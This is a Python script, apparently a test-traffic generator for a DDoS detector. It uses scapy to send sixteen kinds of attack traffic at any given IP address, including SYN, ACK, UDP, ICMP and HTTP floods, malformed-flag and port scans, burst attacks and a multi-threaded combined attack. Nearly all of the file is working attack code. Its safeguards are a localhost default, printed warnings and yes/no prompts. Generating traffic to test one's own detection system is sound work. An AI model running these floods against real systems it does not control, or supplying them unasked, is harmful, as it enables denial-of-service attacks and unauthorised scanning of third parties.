from scapy.all import IP, TCP, UDP, ICMP, Raw, send
import sys
import time
import argparse
import random
import threading
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

# CONFIGURATION
try:
    from config.config import (
        DEFAULT_ATTACK_TARGET,
        DEFAULT_ATTACK_PORT,
        DEFAULT_PACKET_COUNT,
        DEFAULT_PACKET_DELAY,
    )
    CONFIG_LOADED = True
except ImportError:
    CONFIG_LOADED = False
    DEFAULT_ATTACK_TARGET = "127.0.0.1"
    DEFAULT_ATTACK_PORT = 80
    DEFAULT_PACKET_COUNT = 200
    DEFAULT_PACKET_DELAY = 0.001

try:
    from src.utils import validate_ip_address, is_private_or_localhost
except ImportError:
    import ipaddress
    def validate_ip_address(ip: str) -> bool:
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
    
    def is_private_or_localhost(ip: str) -> bool:
        try:
            ip_obj = ipaddress.ip_address(ip)
            return ip_obj.is_private or ip_obj.is_loopback
        except ValueError:
            return False


def print_banner():
    """Print the script banner"""
    print("=" * 70)
    print("ENHANCED DoS ATTACK SIMULATOR - Single Source (16 Attack Types)")
    print("=" * 70)
    print()


def print_attack_header(attack_name: str, target_ip: str, target_port: int, count: int):
    """Print standardized attack header."""
    print(f"🔥 Starting {attack_name}")
    print(f"   Target: {target_ip}:{target_port}")
    print(f"   Packets: {count}")
    print()


# ORIGINAL ATTACK FUNCTIONS

def syn_flood(target_ip, target_port=80, count=200, delay=0.001, silent=False):
    """Simulate a SYN flood attack."""
    if not silent:
        print_attack_header("SYN FLOOD", target_ip, target_port, count)
    
    sent = 0
    try:
        for i in range(count):
            packet = IP(dst=target_ip) / TCP(dport=target_port, flags='S')
            send(packet, verbose=0)
            sent += 1
            
            if not silent and sent % 50 == 0:
                print(f"   [SYN] Sent: {sent}/{count} packets...")
            time.sleep(delay)
    except KeyboardInterrupt:
        if not silent:
            print(f"\n  Attack interrupted")
    except Exception as e:
        if not silent:
            print(f"\n Error: {e}")
    
    if not silent:
        print(f"\n SYN Flood complete. Sent {sent} packets.")
    return sent


def packet_flood(target_ip, target_port=80, count=150, delay=0.001, silent=False):
    """Simulate a general packet flood attack (mixed types)."""
    if not silent:
        print_attack_header("PACKET FLOOD (Mixed)", target_ip, target_port, count)
    
    sent = 0
    try:
        for i in range(count):
            if i % 3 == 0:
                packet = IP(dst=target_ip) / TCP(dport=target_port, flags='A')
            elif i % 3 == 1:
                packet = IP(dst=target_ip) / UDP(dport=target_port)
            else:
                packet = IP(dst=target_ip) / ICMP()
            
            send(packet, verbose=0)
            sent += 1
            
            if not silent and sent % 50 == 0:
                print(f"   [PACKET] Sent: {sent}/{count} packets...")
            time.sleep(delay)
    except KeyboardInterrupt:
        if not silent:
            print(f"\n  Attack interrupted")
    except Exception as e:
        if not silent:
            print(f"\n Error: {e}")
    
    if not silent:
        print(f"\n Packet Flood complete. Sent {sent} packets.")
    return sent


def udp_flood(target_ip, target_port=53, count=150, delay=0.001, silent=False):
    """Simulate a UDP flood attack."""
    if not silent:
        print_attack_header("UDP FLOOD", target_ip, target_port, count)
    
    sent = 0
    try:
        for i in range(count):
            packet = IP(dst=target_ip) / UDP(dport=target_port) / ("X" * 512)
            send(packet, verbose=0)
            sent += 1
            
            if not silent and sent % 50 == 0:
                print(f"   [UDP] Sent: {sent}/{count} packets...")
            time.sleep(delay)
    except KeyboardInterrupt:
        if not silent:
            print(f"\n  Attack interrupted")
    except Exception as e:
        if not silent:
            print(f"\n Error: {e}")
    
    if not silent:
        print(f"\n UDP Flood complete. Sent {sent} packets.")
    return sent


def icmp_flood(target_ip, count=150, delay=0.001, silent=False):
    """Simulate an ICMP flood (ping flood) attack."""
    if not silent:
        print_attack_header("ICMP FLOOD", target_ip, 0, count)
    
    sent = 0
    try:
        for i in range(count):
            packet = IP(dst=target_ip) / ICMP(type=8, code=0, id=random.randint(0, 65535), seq=i) / Raw(b"X" * 56)
            send(packet, verbose=0)
            sent += 1
            
            if not silent and sent % 50 == 0:
                print(f"   [ICMP] Sent: {sent}/{count} packets...")
            time.sleep(delay)
    except KeyboardInterrupt:
        if not silent:
            print(f"\n  Attack interrupted")
    except Exception as e:
        if not silent:
            print(f"\n Error: {e}")
    
    if not silent:
        print(f"\n ICMP Flood complete. Sent {sent} packets.")
    return sent


# NEW ENHANCED ATTACK FUNCTIONS (Features 1-10)

def ack_flood(target_ip, target_port=80, count=150, delay=0.001, silent=False):
    """Feature 1: ACK flood attack."""
    if not silent:
        print_attack_header("ACK FLOOD (Feature 1)", target_ip, target_port, count)
    
    sent = 0
    try:
        for i in range(count):
            packet = IP(dst=target_ip) / TCP(
                dport=target_port, flags='A',
                seq=random.randint(0, 2**32-1), ack=random.randint(0, 2**32-1)
            )
            send(packet, verbose=0)
            sent += 1
            
            if not silent and sent % 50 == 0:
                print(f"   [ACK] Sent: {sent}/{count} packets...")
            time.sleep(delay)
    except KeyboardInterrupt:
        if not silent:
            print(f"\n  Attack interrupted")
    
    if not silent:
        print(f"\n ACK Flood complete. Sent {sent} packets.")
    return sent


def fin_flood(target_ip, target_port=80, count=150, delay=0.001, silent=False):
    """Feature 1: FIN flood attack."""
    if not silent:
        print_attack_header("FIN FLOOD (Feature 1)", target_ip, target_port, count)
    
    sent = 0
    try:
        for i in range(count):
            packet = IP(dst=target_ip) / TCP(dport=target_port, flags='F')
            send(packet, verbose=0)
            sent += 1
            
            if not silent and sent % 50 == 0:
                print(f"   [FIN] Sent: {sent}/{count} packets...")
            time.sleep(delay)
    except KeyboardInterrupt:
        if not silent:
            print(f"\n  Attack interrupted")
    
    if not silent:
        print(f"\n FIN Flood complete. Sent {sent} packets.")
    return sent


def rst_flood(target_ip, target_port=80, count=150, delay=0.001, silent=False):
    """Feature 1: RST flood attack."""
    if not silent:
        print_attack_header("RST FLOOD (Feature 1)", target_ip, target_port, count)
    
    sent = 0
    try:
        for i in range(count):
            packet = IP(dst=target_ip) / TCP(dport=target_port, flags='R')
            send(packet, verbose=0)
            sent += 1
            
            if not silent and sent % 50 == 0:
                print(f"   [RST] Sent: {sent}/{count} packets...")
            time.sleep(delay)
    except KeyboardInterrupt:
        if not silent:
            print(f"\n  Attack interrupted")
    
    if not silent:
        print(f"\n RST Flood complete. Sent {sent} packets.")
    return sent


def xmas_scan(target_ip, target_port=80, count=50, delay=0.01, silent=False):
    """Feature 1: XMAS scan attack (FIN+PSH+URG - malformed)."""
    if not silent:
        print_attack_header("XMAS SCAN (Feature 1 - Malformed)", target_ip, target_port, count)
        print("     XMAS packets have FIN+PSH+URG flags - always malicious!")
        print()
    
    sent = 0
    try:
        for i in range(count):
            packet = IP(dst=target_ip) / TCP(dport=target_port, flags='FPU')
            send(packet, verbose=0)
            sent += 1
            
            if not silent and sent % 20 == 0:
                print(f"   [XMAS] Sent: {sent}/{count} malformed packets...")
            time.sleep(delay)
    except KeyboardInterrupt:
        if not silent:
            print(f"\n  Attack interrupted")
    
    if not silent:
        print(f"\n XMAS Scan complete. Sent {sent} malformed packets.")
    return sent


def null_scan(target_ip, target_port=80, count=50, delay=0.01, silent=False):
    """Feature 1: NULL scan attack (no TCP flags - malformed)."""
    if not silent:
        print_attack_header("NULL SCAN (Feature 1 - Malformed)", target_ip, target_port, count)
        print("     NULL packets have NO flags set - always suspicious!")
        print()
    
    sent = 0
    try:
        for i in range(count):
            packet = IP(dst=target_ip) / TCP(dport=target_port, flags=0)
            send(packet, verbose=0)
            sent += 1
            
            if not silent and sent % 20 == 0:
                print(f"   [NULL] Sent: {sent}/{count} malformed packets...")
            time.sleep(delay)
    except KeyboardInterrupt:
        if not silent:
            print(f"\n  Attack interrupted")
    
    if not silent:
        print(f"\n NULL Scan complete. Sent {sent} malformed packets.")
    return sent


def invalid_flags_attack(target_ip, target_port=80, count=50, delay=0.01, silent=False):
    """Feature 1: Invalid TCP flag combinations (SYN+FIN, SYN+RST)."""
    if not silent:
        print_attack_header("INVALID FLAGS (Feature 1 - Malformed)", target_ip, target_port, count)
        print("     Sending impossible flag combinations (SYN+FIN, SYN+RST)!")
        print()
    
    invalid_flag_combos = ['SF', 'SR', 'SFR', 'SFRP']
    sent = 0
    try:
        for i in range(count):
            flags = invalid_flag_combos[i % len(invalid_flag_combos)]
            packet = IP(dst=target_ip) / TCP(dport=target_port, flags=flags)
            send(packet, verbose=0)
            sent += 1
            
            if not silent and sent % 20 == 0:
                print(f"   [INVALID] Sent: {sent}/{count} malformed packets...")
            time.sleep(delay)
    except KeyboardInterrupt:
        if not silent:
            print(f"\n  Attack interrupted")
    
    if not silent:
        print(f"\n Invalid Flags attack complete. Sent {sent} malformed packets.")
    return sent


def small_packet_flood(target_ip, target_port=80, count=300, delay=0.0005, silent=False):
    """Feature 2: Small packet flood (minimal size packets)."""
    if not silent:
        print_attack_header("SMALL PACKET FLOOD (Feature 2)", target_ip, target_port, count)
        print("   Packet size: ~40 bytes (minimal)")
        print()
    
    sent = 0
    try:
        for i in range(count):
            packet = IP(dst=target_ip) / TCP(dport=target_port, flags='S')
            send(packet, verbose=0)
            sent += 1
            
            if not silent and sent % 100 == 0:
                print(f"   [SMALL] Sent: {sent}/{count} tiny packets...")
            time.sleep(delay)
    except KeyboardInterrupt:
        if not silent:
            print(f"\n  Attack interrupted")
    
    if not silent:
        print(f"\n Small Packet Flood complete. Sent {sent} packets.")
    return sent


def large_packet_flood(target_ip, target_port=53, count=100, delay=0.005, silent=False):
    """Feature 2: Large packet flood (amplification-style)."""
    if not silent:
        print_attack_header("LARGE PACKET FLOOD (Feature 2)", target_ip, target_port, count)
        print("   Payload size: 1200 bytes (large packets)")
        print()
    
    payload = Raw(b"X" * 1200)
    sent = 0
    total_bytes = 0
    try:
        for i in range(count):
            packet = IP(dst=target_ip) / UDP(dport=target_port) / payload
            send(packet, verbose=0)
            sent += 1
            total_bytes += len(packet)
            
            if not silent and sent % 25 == 0:
                print(f"   [LARGE] Sent: {sent}/{count} large packets ({total_bytes/1024:.1f} KB)...")
            time.sleep(delay)
    except KeyboardInterrupt:
        if not silent:
            print(f"\n  Attack interrupted")
    
    if not silent:
        print(f"\n Large Packet Flood complete. Sent {sent} packets ({total_bytes/1024:.1f} KB).")
    return sent


def port_scan(target_ip, port_count=50, delay=0.01, silent=False):
    """Feature 4: Port scanning simulation."""
    if not silent:
        print_attack_header("PORT SCAN (Feature 4)", target_ip, 0, port_count)
        print(f"   Scanning {port_count} different ports!")
        print()
    
    ports = random.sample(range(1, 65535), port_count)
    sent = 0
    try:
        for port in ports:
            packet = IP(dst=target_ip) / TCP(dport=port, flags='S')
            send(packet, verbose=0)
            sent += 1
            
            if not silent and sent % 20 == 0:
                print(f"   [SCAN] Scanned: {sent}/{port_count} ports...")
            time.sleep(delay)
    except KeyboardInterrupt:
        if not silent:
            print(f"\n  Attack interrupted")
    
    if not silent:
        print(f"\n Port Scan complete. Scanned {sent} ports.")
    return sent


def burst_attack(target_ip, target_port=80, bursts=10, packets_per_burst=30, delay=0.001, silent=False):
    """Feature 8: Burst attack (rapid micro-bursts)."""
    total_packets = bursts * packets_per_burst
    if not silent:
        print_attack_header("BURST ATTACK (Feature 8)", target_ip, target_port, total_packets)
        print(f"   Bursts: {bursts}, Packets per burst: {packets_per_burst}")
        print("     Packets sent in rapid micro-bursts!")
        print()
    
    sent = 0
    try:
        for b in range(bursts):
            # Send burst as fast as possible
            for _ in range(packets_per_burst):
                packet = IP(dst=target_ip) / TCP(dport=target_port, flags='S')
                send(packet, verbose=0)
                sent += 1
                time.sleep(delay)
            
            if not silent:
                print(f"   [BURST] Burst {b+1}/{bursts} complete ({sent} packets total)...")
            time.sleep(0.05)  # Pause between bursts
    except KeyboardInterrupt:
        if not silent:
            print(f"\n  Attack interrupted")
    
    if not silent:
        print(f"\n Burst Attack complete. Sent {sent} packets in {bursts} bursts.")
    return sent


def http_flood(target_ip, target_port=80, count=100, delay=0.005, silent=False):
    """Feature 10: HTTP request flood."""
    if not silent:
        print_attack_header("HTTP FLOOD (Feature 10)", target_ip, target_port, count)
        print("   Sending HTTP GET requests!")
        print()
    
    http_payload = b"GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
    sent = 0
    try:
        for i in range(count):
            packet = IP(dst=target_ip) / TCP(dport=target_port, flags='PA') / Raw(http_payload)
            send(packet, verbose=0)
            sent += 1
            
            if not silent and sent % 25 == 0:
                print(f"   [HTTP] Sent: {sent}/{count} requests...")
            time.sleep(delay)
    except KeyboardInterrupt:
        if not silent:
            print(f"\n  Attack interrupted")
    
    if not silent:
        print(f"\n HTTP Flood complete. Sent {sent} requests.")
    return sent


# COMBINED ATTACK

def combined_attack(target_ip, target_port=80, count=200, delay=0.001):
    """Launch all attack types simultaneously."""
    if not validate_ip_address(target_ip):
        print(f" Error: Invalid IP address '{target_ip}'")
        return
    
    if not is_private_or_localhost(target_ip):
        print(f"  Warning: Target IP {target_ip} is not private/localhost")
        confirm = input("Are you sure you want to proceed? (yes/no): ")
        if confirm.lower() != 'yes':
            print("Attack cancelled.")
            return
    
    print(f"🔥🔥🔥 Starting COMBINED MULTI-VECTOR ATTACK 🔥🔥🔥")
    print(f"   Target: {target_ip}:{target_port}")
    print(f"   Packets per attack: {count}")
    print(f"   Attack vectors: SYN + ACK + UDP + ICMP + FIN")
    print()
    
    results = {'syn': 0, 'ack': 0, 'udp': 0, 'icmp': 0, 'fin': 0}
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        print("⚡ Launching all attack vectors simultaneously...")
        print()
        
        future_syn = executor.submit(syn_flood, target_ip, target_port, count, delay, silent=True)
        future_ack = executor.submit(ack_flood, target_ip, target_port, count, delay, silent=True)
        future_udp = executor.submit(udp_flood, target_ip, target_port + 1, count, delay, silent=True)
        future_icmp = executor.submit(icmp_flood, target_ip, count, delay, silent=True)
        future_fin = executor.submit(fin_flood, target_ip, target_port + 2, count, delay, silent=True)
        
        futures = {
            future_syn: 'syn', future_ack: 'ack', future_udp: 'udp',
            future_icmp: 'icmp', future_fin: 'fin'
        }
        
        try:
            for future in futures:
                attack_type = futures[future]
                try:
                    results[attack_type] = future.result()
                except Exception as e:
                    print(f" {attack_type} failed: {e}")
        except KeyboardInterrupt:
            print("\n\n  Attack interrupted by user")
            return
    
    duration = time.time() - start_time
    total_packets = sum(results.values())
    
    print("\n" + "=" * 70)
    print(" COMBINED ATTACK SUMMARY")
    print("=" * 70)
    print(f"   Target:           {target_ip}")
    print(f"   Duration:         {duration:.2f} seconds")
    print(f"   Total Packets:    {total_packets}")
    print(f"   Packets/second:   {total_packets/duration:.2f}")
    print()
    for attack_type, count in results.items():
        print(f"   {attack_type.upper():10}: {count} packets")
    print("=" * 70)


# MAIN FUNCTION

def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description='ENHANCED DoS Attack Simulator - Single Source (16 Attack Types)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Types (16 total):
  ORIGINAL:
    syn        - SYN flood attack
    packet     - Mixed packet flood (SYN+UDP+ICMP)
    udp        - UDP flood attack
    icmp       - ICMP flood (ping flood)
    all        - Combined multi-vector attack

  TCP FLAG ATTACKS (Feature 1):
    ack        - ACK flood attack
    fin        - FIN flood attack
    rst        - RST flood attack
    xmas       - XMAS scan (FIN+PSH+URG - malformed)
    null       - NULL scan (no flags - malformed)
    invalid    - Invalid flag combinations (SYN+FIN)

  PACKET SIZE (Feature 2):
    smallpkt   - Small packet flood
    largepkt   - Large packet flood

  OTHER:
    portscan   - Port scanning simulation
    burst      - Burst attack (rapid micro-bursts)
    http       - HTTP request flood

Examples:
  # Combined multi-vector attack
  sudo python3 simulate_attack.py --target 127.0.0.1 --type all

  # XMAS scan (malformed packets)
  sudo python3 simulate_attack.py --target 127.0.0.1 --type xmas

  # Port scan simulation  
  sudo python3 simulate_attack.py --target 127.0.0.1 --type portscan

IMPORTANT: Only use on systems you own or have permission to test!
        """
    )
    
    all_types = ['syn', 'packet', 'udp', 'icmp', 'all',
                 'ack', 'fin', 'rst', 'xmas', 'null', 'invalid',
                 'smallpkt', 'largepkt', 'portscan', 'burst', 'http']
    
    parser.add_argument('--target', '-t', default=DEFAULT_ATTACK_TARGET, 
                       help=f'Target IP address (default: {DEFAULT_ATTACK_TARGET})')
    parser.add_argument('--type', '-T', choices=all_types, default='all',
                       help='Attack type (default: all)')
    parser.add_argument('--port', '-p', type=int, default=DEFAULT_ATTACK_PORT,
                       help=f'Target port (default: {DEFAULT_ATTACK_PORT})')
    parser.add_argument('--count', '-c', type=int, default=DEFAULT_PACKET_COUNT,
                       help=f'Number of packets (default: {DEFAULT_PACKET_COUNT})')
    parser.add_argument('--delay', '-d', type=float, default=DEFAULT_PACKET_DELAY,
                       help=f'Delay between packets (default: {DEFAULT_PACKET_DELAY})')
    
    args = parser.parse_args()
    
    print_banner()
    
    print("  WARNING: This tool is for testing purposes only!")
    print("   Only use on systems you own or have explicit permission to test.")
    print()
    print(f"Attack Configuration:")
    print(f"  Type:   {args.type.upper()}")
    print(f"  Target: {args.target}:{args.port}")
    print(f"  Count:  {args.count} packets")
    print(f"  Delay:  {args.delay}s")
    print()
    
    try:
        response = input("Continue with attack simulation? (yes/no): ")
        if response.lower() not in ['yes', 'y']:
            print("Attack cancelled.")
            sys.exit(0)
    except KeyboardInterrupt:
        print("\nAttack cancelled.")
        sys.exit(0)
    
    print()
    
    if not validate_ip_address(args.target):
        print(f" Error: Invalid IP address '{args.target}'")
        sys.exit(1)
    
    # Execute attacks
    attack_map = {
        'syn': lambda: syn_flood(args.target, args.port, args.count, args.delay),
        'packet': lambda: packet_flood(args.target, args.port, args.count, args.delay),
        'udp': lambda: udp_flood(args.target, args.port, args.count, args.delay),
        'icmp': lambda: icmp_flood(args.target, args.count, args.delay),
        'all': lambda: combined_attack(args.target, args.port, args.count, args.delay),
        'ack': lambda: ack_flood(args.target, args.port, args.count, args.delay),
        'fin': lambda: fin_flood(args.target, args.port, args.count, args.delay),
        'rst': lambda: rst_flood(args.target, args.port, args.count, args.delay),
        'xmas': lambda: xmas_scan(args.target, args.port, min(args.count, 100), args.delay * 5),
        'null': lambda: null_scan(args.target, args.port, min(args.count, 100), args.delay * 5),
        'invalid': lambda: invalid_flags_attack(args.target, args.port, min(args.count, 100), args.delay * 5),
        'smallpkt': lambda: small_packet_flood(args.target, args.port, args.count * 2, args.delay / 2),
        'largepkt': lambda: large_packet_flood(args.target, 53, args.count // 2, args.delay * 3),
        'portscan': lambda: port_scan(args.target, min(args.count, 100), args.delay * 5),
        'burst': lambda: burst_attack(args.target, args.port, 10, 30, args.delay),
        'http': lambda: http_flood(args.target, args.port, args.count, args.delay * 3),
    }
    
    if args.type in attack_map:
        attack_map[args.type]()
    
    print()
    print("=" * 70)
    print(" Check your DDoS detector for alerts and blocked IPs!")
    print("   The detector should identify this as a DoS attack from your IP.")
    print("=" * 70)


if __name__ == "__main__":
    import os
    if os.geteuid() != 0:
        print(" This script requires root privileges to send packets.")
        print(f"   Please run with sudo: sudo python3 {sys.argv[0]}")
        sys.exit(1)
    
    main()
